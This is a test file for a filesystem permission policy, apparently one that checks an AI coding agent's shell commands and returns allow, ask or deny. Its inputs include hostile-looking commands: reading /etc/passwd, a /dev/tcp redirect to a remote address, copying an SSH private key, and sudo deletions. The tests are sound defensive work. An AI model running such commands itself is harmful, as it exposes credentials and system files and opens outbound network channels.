import { describe, expect, it } from "bun:test";
import { homedir } from "node:os";

import { filesystemPolicy } from "../src/policies/filesystem/policy.ts";
import {
  askReason,
  injectionReason,
  memoryReason,
  SUDO_REASON,
} from "../src/policies/filesystem/reasons.ts";
import { ALLOW, ASK, DENY } from "./fixtures/filesystem.ts";
import { MEMORY_ALLOW, MEMORY_ASK } from "./fixtures/memory.ts";
import {
  decisionOf,
  decisionTableTests,
  policyCheck,
  reasonOf,
} from "./helpers/policy.ts";

describe("filesystem policy v2", () => {
  decisionTableTests(filesystemPolicy, { allow: ALLOW, ask: ASK, deny: DENY });

  it("fail-open: unparseable command allows", () => {
    expect(policyCheck(filesystemPolicy, 'cat "')).toBeNull();
  });

  it("allows reading the repo root from a package cwd (repo-in-$HOME scenario)", () => {
    const repo = `${homedir()}/www/repo`;
    expect(
      policyCheck(filesystemPolicy, "cat ../../README.md", {
        cwd: `${repo}/packages/cli-hook`,
        projectRoot: repo,
      }),
    ).toBeNull();
  });
});

describe("filesystem policy v2 (reasons)", () => {
  it("boundary denies quote the offending token", () => {
    expect(
      reasonOf(policyCheck(filesystemPolicy, "cat /etc/passwd")),
    ).toContain("/etc/passwd");
  });

  it("the injection reason quotes the matched pattern", () => {
    expect(
      reasonOf(
        policyCheck(filesystemPolicy, "echo x > /dev/tcp/10.0.0.1/8080"),
      ),
    ).toContain(injectionReason("/dev/tcp/"));
  });

  it("the /tmp deny reason teaches ./tmp/ at the project root", () => {
    expect(reasonOf(policyCheck(filesystemPolicy, "tee /tmp/x y"))).toContain(
      "./tmp/",
    );
  });

  it("the home-whole ask reason carries only the confirm instruction", () => {
    expect(reasonOf(policyCheck(filesystemPolicy, "ls ~"))).toBe(
      askReason("reading the home directory as a whole", "~"),
    );
  });
});

describe("context", () => {
  it("allows writes inside $HOME and inside projectRoot, denies outside the zone", () => {
    const zone = (command: string, cwd: string, projectRoot: string) =>
      decisionOf(policyCheck(filesystemPolicy, command, { cwd, projectRoot }));
    expect(zone("tee build/x x", "/proj/sub", "/proj")).toBeNull();
    expect(
      zone("tee /workspace/repo/x x", "/workspace/repo", "/workspace/repo"),
    ).toBeNull();
    expect(zone("tee /elsewhere/x x", "/proj/sub", "/proj")).toBe("deny");
  });
});

describe("filesystem policy (project memory)", () => {
  decisionTableTests(filesystemPolicy, {
    allow: MEMORY_ALLOW,
    ask: MEMORY_ASK,
    deny: [],
  });

  it("asks with the plain wording for md and the warning wording for non-md", () => {
    expect(
      reasonOf(
        policyCheck(
          filesystemPolicy,
          "tee ~/.claude/projects/-p/memory/n.md n",
        ),
      ),
    ).toBe(memoryReason("~/.claude/projects/-p/memory/n.md", true));
    expect(
      reasonOf(
        policyCheck(
          filesystemPolicy,
          "cp f.txt ~/.claude/projects/-p/memory/f.txt",
        ),
      ),
    ).toBe(memoryReason("~/.claude/projects/-p/memory/f.txt", false));
  });

  it("asks on a relative memory path from a cwd inside the projects tree", () => {
    expect(
      decisionOf(
        policyCheck(filesystemPolicy, "tee memory/x.md", {
          cwd: `${homedir()}/.claude/projects/-p`,
          projectRoot: "/proj",
        }),
      ),
    ).toBe("ask");
  });

  it("deny beats ask when one command hits memory and a deny tier", () => {
    expect(
      decisionOf(
        policyCheck(
          filesystemPolicy,
          "cp ~/.ssh/id_rsa ~/.claude/projects/-p/memory/k.md",
        ),
      ),
    ).toBe("deny");
  });
});

describe("filesystem policy (mutator flags)", () => {
  it("sed -i outside memory stays free inside the zone", () => {
    expect(
      decisionOf(
        policyCheck(filesystemPolicy, "sed -i 's/a/b/' ~/www/repo/f.ts"),
      ),
    ).toBeNull();
  });

  it("find -delete outside the zone denies", () => {
    expect(
      decisionOf(
        policyCheck(filesystemPolicy, "find /workspace -name x -delete"),
      ),
    ).toBe("deny");
  });

  it("the sudo deny fires behind time and parallel, with the sudo reason", () => {
    expect(reasonOf(policyCheck(filesystemPolicy, "time sudo rm x"))).toBe(
      SUDO_REASON,
    );
    expect(reasonOf(policyCheck(filesystemPolicy, "parallel sudo rm x"))).toBe(
      SUDO_REASON,
    );
  });
});
